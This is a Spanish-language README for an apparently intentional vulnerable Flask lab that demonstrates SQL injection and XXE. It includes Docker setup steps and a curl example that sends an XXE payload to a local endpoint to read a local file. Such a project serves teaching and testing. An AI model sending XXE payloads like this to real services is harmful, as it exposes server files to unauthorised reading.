# Extract data

# Proyecto de Inyección SQL y XXE

Este proyecto es una demostración de vulnerabilidades comunes en aplicaciones web, incluyendo inyección SQL y entidades externas XML (XXE). La aplicación está desarrollada en Flask y utiliza SQLite (o PostgreSQL) como base de datos.

## Estructura del Proyecto

```
├── app
│   ├── public
│   │   ├── index.html
│   │   └── login.html
│   ├── src
│   │   ├── app.py
│   │   ├── db.py
│   │   ├── models.py
│   │   ├── prueba.py
│   │   ├── prueba.txt
│   │   ├── __pycache__
│   │   │   └── db.cpython-311.pyc
│   │   ├── static
│   │   │   └── styles.css
│   │   └── utils.py
│   └── templates
│       ├── index.html
│       ├── login.html
│       └── styles.css
├── burp
│   ├── burp-collaborator.txt
│   └── payloads.txt
├── database
│   ├── schema.sql
│   └── seed.sql
├── docker
│   ├── docker-compose.yml
│   └── Dockerfile
├── docs
│   ├── README.md

```

## Requisitos

Asegúrate de tener instaladas las siguientes herramientas:

- [Docker](https://www.docker.com/)
- [Docker Compose](https://docs.docker.com/compose/)

## Instalación

1. **Clona el repositorio:**
    
    ```bash
    git clone <URL_DEL_REPOSITORIO>
    cd <NOMBRE_DEL_REPOSITORIO>/docker
    docker-compose up --build
    
    ```
    

**Acceder a la aplicación:**

Abre tu navegador y ve a `http://127.0.0.1:5000`.

```
curl -X POST http://127.0.0.1:5000/xxe \
-H "Content-Type: application/xml" \
-d '<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///ruta/a/tu/archivo.xml">
]>
<foo>
    <payload>&xxe;</payload>
</foo>'

```
